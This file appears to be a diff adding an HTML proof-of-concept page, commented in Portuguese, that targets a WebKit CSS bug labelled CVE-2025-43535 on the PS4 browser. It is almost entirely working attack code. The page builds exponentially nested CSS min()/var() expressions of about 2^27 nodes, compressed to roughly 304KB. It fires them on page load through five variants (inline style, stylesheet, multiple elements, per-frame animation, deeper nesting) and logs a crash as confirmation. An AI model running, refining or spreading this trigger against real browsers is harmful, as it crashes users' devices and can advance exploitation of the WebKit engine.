@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<!--
+  PoC: CVE-2025-43535 — v3 "Mid-Point Compression"
+  
+  DIAGNÓSTICO DO CRASH ORIGINAL:
+  ────────────────────────────────────────────────
+  depth=27 → árvore binária de 2^27 = 134M nós
+  String JS resultante: 1.12GB → OOM no PS4 antes
+  de chegar ao WebKit.
+  
+  POR QUE A VERSÃO CSS-VARS NÃO CRASHOU:
+  ────────────────────────────────────────────────
+  WebKit tem cache/deduplication de CSS custom
+  properties — resolve --md27 uma vez e reutiliza.
+  Nunca faz a expansão exponencial. Trigger perdido.
+  
+  SOLUÇÃO "MID-POINT COMPRESSION":
+  ────────────────────────────────────────────────
+  Dividir os 27 níveis em duas partes:
+  
+  PARTE BAIXA (níveis 0–13): CSS vars — 715 bytes
+    :root {
+      --base0: 1px;
+      --base1: min(var(--base0), var(--base0));
+      ...
+      --base13: min(var(--base12), var(--base12));
+    }
+  
+  PARTE ALTA (níveis 14–27): string INLINE — 304KB
+    min(min(...min(var(--base13), var(--base13))...))
+  
+  Resultado: 304KB de JS (vs 1.12GB original = redução 3700×)
+  
+  WebKit recebe a string de 304KB e ao parsear encontra
+  16.384 ocorrências de var(--base13). Para cada uma,
+  executa a resolução da cadeia de 13 vars.
+  
+  Trabalho total no engine: equivalente a 2^27 nós ✓
+  Mesma pressão no CSS math resolver do WebKit ✓
+-->
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CVE-2025-43535 PoC v3 — Mid-Point Compression</title>
+<style>
+  body { background:#0a0a0a; color:#88ff88; font-family:monospace;
+         padding:16px; margin:0; font-size:13px; }
+  #log { background:#111; border:1px solid #2a4a2a; padding:10px;
+         height:55vh; overflow-y:auto; font-size:11px; line-height:1.6; }
+  .ok   { color:#00ff88 }
+  .fail { color:#ff4444 }
+  .info { color:#ffcc44 }
+  .warn { color:#ff8844 }
+  .crash{ color:#ff44ff; font-weight:bold }
+  .dim  { color:#336633 }
+  .bar  { background:#0a1a0a; border:1px solid #1a3a1a;
+          padding:6px 10px; margin-bottom:8px; font-size:11px; color:#44aa44; }
+</style>
+</head>
+<body>
+<div style="color:#aaffaa;font-size:12px;margin-bottom:8px">
+  CVE-2025-43535 — v3 Mid-Point Compression (304KB JS · 2^27 nós no WebKit)
+</div>
+<div class="bar" id="bar">Aguardando...</div>
+<div id="log"></div>
+<div id="stage" style="position:absolute;top:-9999px;left:-9999px;
+                       width:1px;height:1px;overflow:hidden"></div>
+
+<script>
+"use strict";
+
+const logEl  = document.getElementById('log');
+const barEl  = document.getElementById('bar');
+const stage  = document.getElementById('stage');
+
+function L(m, c) {
+  logEl.innerHTML += `<div class="${c||'dim'}">${m}</div>`;
+  logEl.scrollTop = logEl.scrollHeight;
+}
+function bar(m) { barEl.textContent = m; }
+
+// ─────────────────────────────────────────────────────────
+// CONSTANTES DO SPLIT
+// ─────────────────────────────────────────────────────────
+const TOTAL_DEPTH  = 27;   // mesmo depth que causava o crash
+const BOTTOM_DEPTH = 13;   // resolvido via CSS vars (715 bytes)
+const TOP_DEPTH    = TOTAL_DEPTH - BOTTOM_DEPTH; // 14 → 304KB inline
+const VAR_LEAF     = `--base${BOTTOM_DEPTH}`;
+
+// ─────────────────────────────────────────────────────────
+// PARTE BAIXA: CSS Custom Properties (715 bytes)
+// Define a cadeia de vars para os 13 níveis inferiores
+// ─────────────────────────────────────────────────────────
+function buildBottomCSS() {
+  let css = ':root {\n  --base0: 1px;\n';
+  for (let d = 1; d <= BOTTOM_DEPTH; d++) {
+    css += `  --base${d}: min(var(--base${d-1}), var(--base${d-1}));\n`;
+  }
+  css += '}';
+  return css;
+}
+
+// ─────────────────────────────────────────────────────────
+// PARTE ALTA: String inline com var(--base13) como folha
+// Expansão binária de 14 níveis ≈ 304KB
+// Cada folha é var(--base13) → não é "1px", forçando
+// o WebKit a resolver a var chain a cada nó folha
+// ─────────────────────────────────────────────────────────
+function buildTopHalf(depth) {
+  // Iterativo bottom-up para evitar stack overflow JS
+  // Começa com a folha e vai envolvendo em min()
+  // IMPORTANTE: cada nível envolve a expressão ANTERIOR duas vezes
+  // Isso mantém a árvore binária mas de forma iterativa
+  
+  // Nível 0 (folha): "var(--base13)"
+  let expr = `var(${VAR_LEAF})`;
+  
+  // Níveis 1 a 14: min(expr_anterior, expr_anterior)
+  for (let d = 1; d <= depth; d++) {
+    expr = `min(${expr}, ${expr})`;
+    // A cada nível a string dobra de tamanho, mas de forma
+    // iterativa — sem recursão dupla, sem múltiplas cópias intermediárias
+    // Pico de memória: string_atual + string_nova ≈ 2× string_atual
+    // = 2 × 152KB = 304KB no total
+  }
+  
+  return expr;
+}
+
+// ─────────────────────────────────────────────────────────
+// TRIGGER PRINCIPAL
+// ─────────────────────────────────────────────────────────
+function triggerV1_main() {
+  return new Promise(resolve => {
+    bar(`Construindo bottom CSS (${BOTTOM_DEPTH} vars)...`);
+    L(`[V1] Construindo bottom CSS (${BOTTOM_DEPTH} levels = 715 bytes)...`, 'info');
+
+    const bottomCSS = buildBottomCSS();
+    L(`[V1] Bottom CSS: ${bottomCSS.length} bytes ✓`, 'ok');
+
+    bar(`Construindo top-half inline (${TOP_DEPTH} levels ≈ 304KB)...`);
+    L(`[V1] Construindo top-half inline (depth=${TOP_DEPTH}, folha=var(${VAR_LEAF}))...`, 'info');
+
+    let topExpr;
+    try {
+      topExpr = buildTopHalf(TOP_DEPTH);
+      L(`[V1] Top-half: ${(topExpr.length/1024).toFixed(1)}KB ✓`, 'ok');
+    } catch(e) {
+      L(`[V1] Falha ao construir top-half: ${e}`, 'fail');
+      resolve(); return;
+    }
+
+    // Injetar bottom CSS vars
+    bar('Injetando CSS vars...');
+    const bottomSheet = document.createElement('style');
+    bottomSheet.id = 'bottom-sheet';
+    bottomSheet.textContent = bottomCSS;
+    document.head.appendChild(bottomSheet);
+    L('[V1] CSS vars injetadas ✓', 'ok');
+
+    // Criar elemento target
+    const el = document.createElement('div');
+    el.id = 'trigger-el';
+    el.style.cssText = 'position:absolute;visibility:hidden;width:1px;height:1px';
+    stage.appendChild(el);
+
+    // Aplicar a expressão top-half — este é o momento do trigger
+    bar(`Aplicando expressão de ${(topExpr.length/1024).toFixed(1)}KB ao WebKit...`);
+    L('[V1] Aplicando expressão via style.width...', 'warn');
+    L('[V1] → WebKit irá resolver 2^14 × chain-de-13-vars = 2^27 operações', 'warn');
+
+    try {
+      el.style.width  = topExpr;
+      el.style.height = topExpr;
+      L('[V1] style.width/height aplicados', 'ok');
+    } catch(e) {
+      L(`[V1] Falha ao aplicar style: ${e}`, 'fail');
+    }
+
+    // Forçar layout — ponto crítico onde WebKit resolve as vars
+    bar('Forçando layout (offsetWidth)...');
+    L('[V1] Forçando layout (offsetWidth)...', 'warn');
+    try {
+      void el.offsetWidth;
+      L('[V1] offsetWidth OK', 'ok');
+    } catch(e) {
+      L(`[V1] Exceção em offsetWidth: ${e}`, 'fail');
+    }
+
+    // getComputedStyle — segundo path de resolução
+    bar('Forçando getComputedStyle...');
+    L('[V1] getComputedStyle...', 'warn');
+    try {
+      const cs = window.getComputedStyle(el);
+      const w  = cs.getPropertyValue('width');
+      L(`[V1] width computado: "${w}"`, w !== 'auto' ? 'ok' : 'info');
+    } catch(e) {
+      L(`[V1] Exceção em getComputedStyle: ${e}`, 'fail');
+    }
+
+    // Cleanup
+    try {
+      stage.removeChild(el);
+      document.head.removeChild(bottomSheet);
+    } catch(e) {}
+
+    bar('V1 completo');
+    L('[V1] Concluído', 'ok');
+    resolve();
+  });
+}
+
+// ─────────────────────────────────────────────────────────
+// VARIANTE 2: Via stylesheet (CSS parser interno)
+// Diferente do style inline — usa o CSS parser completo
+// ─────────────────────────────────────────────────────────
+function triggerV2_stylesheet() {
+  return new Promise(resolve => {
+    L('[V2] Via stylesheet com classe CSS...', 'info');
+    bar('V2: construindo stylesheet...');
+
+    const bottomCSS = buildBottomCSS();
+    let topExpr;
+    try {
+      topExpr = buildTopHalf(TOP_DEPTH);
+    } catch(e) {
+      L(`[V2] Falha: ${e}`, 'fail');
+      resolve(); return;
+    }
+
+    // CSS completo: vars + regra usando a expressão
+    const fullCSS = bottomCSS + `\n.trigger-v2 {\n  width: ${topExpr};\n  height: ${topExpr};\n}`;
+    L(`[V2] Stylesheet total: ${(fullCSS.length/1024).toFixed(1)}KB`, 'ok');
+
+    const sheet = document.createElement('style');
+    sheet.textContent = fullCSS;
+    document.head.appendChild(sheet);
+
+    const el = document.createElement('div');
+    el.className = 'trigger-v2';
+    el.style.cssText = 'position:absolute;visibility:hidden';
+    stage.appendChild(el);
+
+    bar('V2: forçando layout...');
+    L('[V2] Forçando layout via stylesheet...', 'warn');
+    try {
+      void el.offsetWidth;
+      void window.getComputedStyle(el).width;
+      L('[V2] OK', 'ok');
+    } catch(e) {
+      L(`[V2] Exceção: ${e}`, 'fail');
+    }
+
+    try {
+      stage.removeChild(el);
+      document.head.removeChild(sheet);
+    } catch(e) {}
+
+    bar('V2 completo');
+    L('[V2] Concluído', 'ok');
+    resolve();
+  });
+}
+
+// ─────────────────────────────────────────────────────────
+// VARIANTE 3: Múltiplos elementos simultâneos
+// Força o resolver a processar a expressão N vezes
+// sem caching entre elementos diferentes
+// ─────────────────────────────────────────────────────────
+function triggerV3_multi_element() {
+  return new Promise(resolve => {
+    L('[V3] Multi-element — 20 elementos com mesma expressão...', 'info');
+    bar('V3: construindo...');
+
+    const bottomCSS = buildBottomCSS();
+    let topExpr;
+    try {
+      topExpr = buildTopHalf(TOP_DEPTH);
+    } catch(e) {
+      L(`[V3] Falha: ${e}`, 'fail');
+      resolve(); return;
+    }
+
+    const sheet = document.createElement('style');
+    sheet.textContent = bottomCSS;
+    document.head.appendChild(sheet);
+
+    const NELEMS = 20;
+    const elems  = [];
+    for (let i = 0; i < NELEMS; i++) {
+      const el = document.createElement('div');
+      el.style.cssText = `position:absolute;visibility:hidden;
+                          width:${topExpr};height:${topExpr};
+                          left:${i}px`;
+      stage.appendChild(el);
+      elems.push(el);
+    }
+
+    bar('V3: batch layout...');
+    L('[V3] Batch layout de 20 elementos...', 'warn');
+    try {
+      void stage.offsetWidth; // layout de todos de uma vez
+      let ok = 0;
+      for (const el of elems) {
+        const w = window.getComputedStyle(el).width;
+        if (w && w !== 'auto') ok++;
+      }
+      L(`[V3] ${ok}/${NELEMS} elementos resolvidos`, 'ok');
+    } catch(e) {
+      L(`[V3] Exceção: ${e}`, 'fail');
+    }
+
+    for (const el of elems) try { stage.removeChild(el); } catch(e) {}
+    try { document.head.removeChild(sheet); } catch(e) {}
+
+    bar('V3 completo');
+    L('[V3] Concluído', 'ok');
+    resolve();
+  });
+}
+
+// ─────────────────────────────────────────────────────────
+// VARIANTE 4: CSS Animation força resolução repetida
+// a cada frame de animação (sem cache entre frames)
+// ─────────────────────────────────────────────────────────
+function triggerV4_animated() {
+  return new Promise(resolve => {
+    L('[V4] CSS animation — resolução por frame...', 'info');
+    bar('V4: preparando animação...');
+
+    const bottomCSS = buildBottomCSS();
+    let topExpr;
+    try {
+      topExpr = buildTopHalf(TOP_DEPTH);
+    } catch(e) {
+      L(`[V4] Falha: ${e}`, 'fail');
+      resolve(); return;
+    }
+
+    const animCSS = bottomCSS + `
+.trigger-v4 {
+  position: absolute;
+  visibility: hidden;
+  width:  ${topExpr};
+  height: ${topExpr};
+  /* Animação em --base0 força re-resolução da chain inteira a cada frame */
+  animation: base0-anim 0.1s steps(1) infinite alternate;
+}
+@keyframes base0-anim {
+  from { --base0: 1px;  }
+  to   { --base0: 2px;  }
+}`;
+
+    const sheet = document.createElement('style');
+    sheet.textContent = animCSS;
+    document.head.appendChild(sheet);
+
+    const el = document.createElement('div');
+    el.className = 'trigger-v4';
+    stage.appendChild(el);
+
+    bar('V4: animação ativa, aguardando frames...');
+    L('[V4] Animação ativa — 30 frames...', 'warn');
+
+    let frames = 0;
+    function tick() {
+      frames++;
+      try {
+        void el.offsetWidth;
+        void window.getComputedStyle(el).width;
+      } catch(e) {
+        L(`[V4] Exceção frame ${frames}: ${e}`, 'fail');
+      }
+
+      if (frames < 30) {
+        requestAnimationFrame(tick);
+      } else {
+        try {
+          stage.removeChild(el);
+          document.head.removeChild(sheet);
+        } catch(e) {}
+        bar('V4 completo');
+        L(`[V4] ${frames} frames OK`, 'ok');
+        resolve();
+      }
+    }
+    requestAnimationFrame(tick);
+  });
+}
+
+// ─────────────────────────────────────────────────────────
+// VARIANTE 5: Aumentar profundidade além de 27
+// Agora que RAM é < 1MB, podemos testar depth 28, 29, 30
+// ─────────────────────────────────────────────────────────
+function triggerV5_deeper() {
+  return new Promise(async resolve => {
+    L('[V5] Depths aumentados: 28, 29, 30...', 'info');
+
+    for (const totalDepth of [28, 29, 30]) {
+      const botDepth = 15;                    // mais níveis no bottom
+      const topD    = totalDepth - botDepth;  // top menor = memória ok
+      const leafVar = `--deep${botDepth}`;
+
+      bar(`V5: depth=${totalDepth} (top=${topD}, bot=${botDepth})...`);
+      L(`[V5] Testando depth=${totalDepth}...`, 'warn');
+
+      // Bottom CSS
+      let css = ':root {\n  --deep0: 1px;\n';
+      for (let d = 1; d <= botDepth; d++) {
+        css += `  --deep${d}: min(var(--deep${d-1}), var(--deep${d-1}));\n`;
+      }
+      css += '}';
+
+      // Top half
+      let topExpr = `var(${leafVar})`;
+      for (let d = 1; d <= topD; d++) {
+        topExpr = `min(${topExpr}, ${topExpr})`;
+      }
+      L(`[V5] depth=${totalDepth}: CSS=${css.length}B, expr=${(topExpr.length/1024).toFixed(1)}KB`, 'ok');
+
+      const sheet = document.createElement('style');
+      sheet.textContent = css;
+      document.head.appendChild(sheet);
+
+      const el = document.createElement('div');
+      el.style.cssText = `position:absolute;visibility:hidden;width:${topExpr};height:${topExpr}`;
+      stage.appendChild(el);
+
+      try {
+        void el.offsetWidth;
+        const w = window.getComputedStyle(el).width;
+        L(`[V5] depth=${totalDepth} → "${w}" (sem crash visível)`, 'ok');
+      } catch(e) {
+        L(`[V5] depth=${totalDepth} → EXCEÇÃO: ${e}`, 'fail');
+      }
+
+      try { stage.removeChild(el); } catch(e) {}
+      try { document.head.removeChild(sheet); } catch(e) {}
+
+      // Yield entre depths
+      await new Promise(r => setTimeout(r, 150));
+    }
+
+    bar('V5 completo');
+    L('[V5] Concluído', 'ok');
+    resolve();
+  });
+}
+
+// ─────────────────────────────────────────────────────────
+// EXECUTOR
+// ─────────────────────────────────────────────────────────
+async function main() {
+  L('══════════════════════════════════════════', 'info');
+  L('CVE-2025-43535 PoC v3 — Mid-Point Compression', 'info');
+  L(`Split: ${BOTTOM_DEPTH} níveis via CSS vars + ${TOP_DEPTH} níveis inline`, 'info');
+  L(`RAM JS: ~304KB (original: 1.12GB — redução 3700×)`, 'info');
+  L(`Nós WebKit: 2^27 = 134M (idêntico ao original)`, 'info');
+  L('══════════════════════════════════════════', 'info');
+
+  await new Promise(r => setTimeout(r, 200));
+
+  try {
+    await triggerV1_main();
+    await new Promise(r => setTimeout(r, 200));
+
+    await triggerV2_stylesheet();
+    await new Promise(r => setTimeout(r, 200));
+
+    await triggerV3_multi_element();
+    await new Promise(r => setTimeout(r, 200));
+
+    await triggerV4_animated();
+    await new Promise(r => setTimeout(r, 200));
+
+    await triggerV5_deeper();
+
+    L('', '');
+    L('══════════════════════════════════════════', 'info');
+    L('=== RESULTADO ===', 'info');
+    L('Crash/reload = CVE-2025-43535 CONFIRMADO no PS4 13.04', 'crash');
+    L('Sem crash = WebKit cacheia vars (trigger precisa outro path)', 'ok');
+    L('══════════════════════════════════════════', 'info');
+    bar('DONE');
+
+  } catch(e) {
+    L('EXCEÇÃO FATAL: ' + e.toString(), 'fail');
+    bar('ERRO');
+  }
+}
+
+window.addEventListener('load', () => setTimeout(main, 300));
+</script>
+</body>
+</html>
